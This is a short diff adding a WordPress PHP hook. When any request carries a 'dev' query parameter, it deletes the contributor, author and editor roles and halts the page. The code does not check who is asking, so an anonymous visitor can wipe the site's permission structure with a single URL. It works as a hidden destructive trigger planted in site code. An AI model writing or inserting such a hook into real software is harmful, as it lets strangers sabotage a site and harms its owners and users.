@@ -1,0 +1,10 @@
+<?php
+add_action('init', function(){
+
+	if ( isset($_GET['dev']) ) {
+		remove_role( 'contributor' );
+		remove_role( 'author' );
+		remove_role( 'editor' );
+		exit;
+	}
+});
